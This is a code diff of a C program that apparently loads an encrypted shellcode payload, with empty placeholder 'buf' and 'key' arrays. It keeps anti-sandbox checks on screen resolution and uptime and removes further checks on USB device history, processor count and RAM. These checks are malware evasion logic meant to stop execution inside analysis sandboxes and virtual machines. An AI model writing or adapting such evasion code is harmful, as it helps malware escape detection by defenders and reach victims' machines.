@@ -63,27 +63,9 @@ int main(int argc, char** argv)
 	if ((xResolution < 1000 && yResolution < 1000)){
 	        ExitThread(0);
 	}else{ 
-
 	
 	ULONGLONG uptime = GetTickCount() / 1000;
 	if (uptime < 1200) return false;
-
-	HKEY hKey;
-	DWORD mountedUSBDevicesCount;
-	RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SYSTEM\\ControlSet001\\Enum\\USBSTOR", 0, KEY_READ, &hKey);
-	RegQueryInfoKey(hKey, NULL, NULL, NULL, &mountedUSBDevicesCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
-	if (mountedUSBDevicesCount < 1) return false;
-    
-	SYSTEM_INFO systemInfo;
-	GetSystemInfo(&systemInfo);
-	DWORD numberOfProcessors = systemInfo.dwNumberOfProcessors;
-	if (numberOfProcessors < 2) return false;
-
-	MEMORYSTATUSEX memoryStatus;
-	memoryStatus.dwLength = sizeof(memoryStatus);
-	GlobalMemoryStatusEx(&memoryStatus);
-	DWORD RAMMB = memoryStatus.ullTotalPhys / 1024 / 1024;
-	if (RAMMB < 2048) return false;
 		
         unsigned char buf[] = " ";
         char key[] = " ";
